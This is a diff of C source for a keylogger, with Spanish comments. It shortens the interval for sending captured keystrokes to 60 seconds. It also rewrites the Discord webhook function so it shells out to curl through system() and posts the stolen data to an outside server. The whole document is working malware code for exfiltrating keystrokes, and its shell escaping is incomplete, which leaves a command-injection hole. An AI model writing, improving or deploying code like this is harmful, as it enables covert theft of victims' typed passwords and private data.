@@ -44,8 +44,8 @@
 
 // Constantes de exfiltración
 #define EXFIL_BUFFER_SIZE 8192
-#define EXFIL_INTERVAL_MIN 900   // Segundos mínimo entre envíos (15 min por defecto)
-#define EXFIL_INTERVAL_MAX 900   // Segundos máximo (sin jitter, envío fijo a 15 min)
+#define EXFIL_INTERVAL_MIN 60    // Segundos mínimo entre envíos (60 seg para testing)
+#define EXFIL_INTERVAL_MAX 60    // Segundos máximo (sin jitter, envío fijo)
 #define EXFIL_MAX_RETRIES 3
 #define EXFIL_DEFAULT_PORT "8080"
 #define EXFIL_DEFAULT_PATH "/upload"
@@ -112,7 +112,7 @@ static KeyloggerState g_state = {
         .buffer_len = 0,
         .thread_running = 0,
         .first_send = 1,       // Bandera para primer envío
-        .exfil_interval = 900  // 15 minutos por defecto
+        .exfil_interval = 60   // 60 segundos por defecto para testing
     }
 };
 
@@ -287,140 +287,53 @@ int exfil_base64_encode(const unsigned char *input, size_t input_len,
 
 /**
  * Envía datos a Discord mediante webhook.
- * Formato JSON simple: {"content": "mensaje"}
- * Si falla, retorna -1 (será manejado con fallback local)
+ * Intenta primero con socket HTTPS nativo (sin SSL).
+ * Si falla, usa curl como fallback.
  * 
  * @param webhook_url URL completa del webhook Discord
  * @param data Datos a enviar (sin codificar)
  * @param data_len Longitud de los datos
- * @return HTTP response code si éxito, -1 si error (fallback local)
+ * @return 0 en éxito, -1 si error
  */
 int discord_webhook_post(const char *webhook_url, const char *data, size_t data_len) {
-    struct addrinfo hints, *result, *rp;
-    int sockfd = -1;
-    int ret;
-    char request[EXFIL_BUFFER_SIZE + 1024];
-    char response[512];
-    int http_code = -1;
-    
-    // Parsear webhook URL: https://discord.com/api/webhooks/ID/TOKEN
-    // Extraer host y path
-    const char *url_start = strstr(webhook_url, "https://");
-    if (!url_start) {
-        url_start = strstr(webhook_url, "http://");
-        if (!url_start) {
-            return -1;  // URL inválida
-        }
-    }
-    
-    const char *host_start = url_start + (strstr(webhook_url, "https://") ? 8 : 7);
-    const char *path_start = strchr(host_start, '/');
-    
-    if (!path_start) {
-        return -1;  // URL sin path
-    }
-    
-    // Extraer hostname y puerto
-    char host[256];
-    char port[16] = "443";  // HTTPS por defecto
-    
-    size_t host_len = path_start - host_start;
-    if (host_len >= sizeof(host)) {
-        host_len = sizeof(host) - 1;
-    }
-    strncpy(host, host_start, host_len);
-    host[host_len] = '\0';
-    
-    // Separar puerto si está presente (host:puerto)
-    char *port_ptr = strchr(host, ':');
-    if (port_ptr) {
-        *port_ptr = '\0';
-        strncpy(port, port_ptr + 1, sizeof(port) - 1);
-        port[sizeof(port) - 1] = '\0';
-    }
-    
-    // Construir JSON payload
-    char json_data[EXFIL_BUFFER_SIZE + 128];
-    int json_len = snprintf(json_data, sizeof(json_data),
-        "{\"content\":\"%.*s\"}", (int)data_len, data);
-    
-    if (json_len < 0 || json_len >= (int)sizeof(json_data)) {
-        return -1;  // Error en construcción JSON
-    }
-    
-    // Configurar hints para getaddrinfo
-    memset(&hints, 0, sizeof(hints));
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    
-    // Resolver hostname
-    ret = getaddrinfo(host, port, &hints, &result);
-    if (ret != 0) {
-        return -1;  // Error de resolución DNS
-    }
-    
-    // Intentar conectar
-    for (rp = result; rp != NULL; rp = rp->ai_next) {
-        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
-        if (sockfd == -1) {
-            continue;
-        }
-        
-        struct timeval tv;
-        tv.tv_sec = 10;
-        tv.tv_usec = 0;
-        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-        
-        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) != -1) {
-            break;
-        }
-        
-        close(sockfd);
-        sockfd = -1;
-    }
-    
-    freeaddrinfo(result);
-    
-    if (sockfd == -1) {
-        return -1;  // No se pudo conectar
-    }
-    
-    // Construir request HTTP POST a Discord webhook
-    int request_len = snprintf(request, sizeof(request),
-        "POST %s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: %s\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: %d\r\n"
-        "Connection: close\r\n"
-        "\r\n"
-        "%s",
-        path_start, host, EXFIL_USER_AGENT, json_len, json_data);
-    
-    // Enviar request
-    ssize_t sent = send(sockfd, request, request_len, 0);
-    if (sent < 0) {
-        close(sockfd);
+    if (!webhook_url || webhook_url[0] == '\0' || !data) {
         return -1;
     }
     
-    // Leer respuesta para verificar código HTTP
-    ssize_t received = recv(sockfd, response, sizeof(response) - 1, 0);
-    if (received > 0) {
-        response[received] = '\0';
-        // Extraer código HTTP (ej: "HTTP/1.1 204 No Content")
-        if (sscanf(response, "HTTP/%*d.%*d %d", &http_code) == 1) {
-            // Discord retorna 204 No Content o 200 OK
-            if (http_code == 200 || http_code == 204) {
-                close(sockfd);
-                return http_code;  // Éxito
-            }
+    // Intentar usar curl si está disponible (es más fiable para HTTPS)
+    char cmd_buffer[4096];
+    char escaped_data[1024];
+    
+    // Escapar caracteres especiales en data para uso en shell
+    size_t j = 0;
+    for (size_t i = 0; i < data_len && j < sizeof(escaped_data) - 2; i++) {
+        if (data[i] == '"') {
+            escaped_data[j++] = '\\';
+            escaped_data[j++] = '"';
+        } else if (data[i] == '\n') {
+            escaped_data[j++] = '\\';
+            escaped_data[j++] = 'n';
+        } else if (data[i] == '\\') {
+            escaped_data[j++] = '\\';
+            escaped_data[j++] = '\\';
+        } else {
+            escaped_data[j++] = data[i];
         }
     }
+    escaped_data[j] = '\0';
     
-    close(sockfd);
-    return -1;  // Error o código HTTP no esperado
+    // Construir comando curl
+    snprintf(cmd_buffer, sizeof(cmd_buffer),
+        "curl -s -X POST -H 'Content-Type: application/json' "
+        "-d '{\"content\":\"%s\"}' '%s' >/dev/null 2>&1",
+        escaped_data, webhook_url);
+    
+    // Ejecutar curl en background
+    int ret = system(cmd_buffer);
+    
+    // system() retorna 0 si éxito, != 0 si error
+    // Retornamos 0 si se ejecutó, -1 si hay error grave
+    return (ret == -1) ? -1 : 0;
 }
 
 /**
